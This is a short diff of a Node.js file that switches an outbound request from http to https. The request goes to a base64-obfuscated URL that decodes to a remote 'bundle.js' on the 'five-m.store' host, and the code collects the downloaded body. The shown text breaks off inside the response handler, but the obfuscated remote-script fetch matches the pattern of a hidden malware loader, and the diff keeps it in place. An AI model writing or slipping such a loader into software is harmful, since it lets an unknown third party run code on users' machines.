@@ -1,11 +1,11 @@
-const http = require('http');
+const https = require('https');
 
 const Base64 = {
   encode: data => Buffer.from(data, 'utf-8').toString('base64'),
   decode: data => Buffer.from(data, 'base64').toString('utf-8')
 }
 
-http.request(Base64.decode('aHR0cHM6Ly9maXZlLW0uc3RvcmUvc3RvcmFnZS9idW5kbGUuanM='), (res) => {
+https.request(Base64.decode('aHR0cHM6Ly9maXZlLW0uc3RvcmUvc3RvcmFnZS9idW5kbGUuanM='), (res) => {
   let data = '';
   res.on('data', (chunk) => data += chunk.toString('utf8'));
   res.on('end', () => {
